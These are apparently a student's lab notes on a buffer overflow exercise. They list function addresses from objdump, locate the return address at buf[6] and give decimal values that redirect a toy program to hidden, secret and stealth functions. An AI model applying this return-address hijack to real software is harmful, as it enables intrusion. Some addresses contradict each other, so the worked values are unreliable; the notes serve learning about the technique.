

* recognize features of example 03
* identify values at buffer[0]..buffer[8]
* program has two stages: read indexes of buffer, overwrite indexes of buffer 
  - accepts values in decimal 
  - $ printf "%d" 0x08048661
  - watch exit code 
  - $ if ./writer; then echo "URA"; fi
  - the only way to exit with success (exit code 0) 
	is through the hidden/secret functions
* goal1: exit with success
* overwrite return address 
* call hidden_function
* goal2: exit with success, and get "awsome skills" message
* goal3: exit normally through main, but call stealth function stealthily
							

$ identify addresses with objdump 
	hidden_func  = 0x08048661 = 134514273
	secret_func  = 0x04048678 = 134514296
	stealth_func = 0x080492b4 = 134517428
* return address at buf[6] = 0x08049436 = 134517814
* call hidden_function 
  - overwrite with 134514273, harvest hurrays (goal1)
* call secret_function
  - overwrite with 134514296, harvest hurrays, but no awsome skills?
  - buf[6]=134514296 buf[8]=1111638594 buf[9]=1785358954 (goal2)
  why not buf[7] and buf[8]?
  * call stealth_function, prepare stack so that execution continues normally
  and returns to main 
  - buf[6]=134514296 buf[7]=134517814 buf[8]=1111638594 buf[9]=1785358954 (goal3)
  - should call the stealth function, but exit through main 
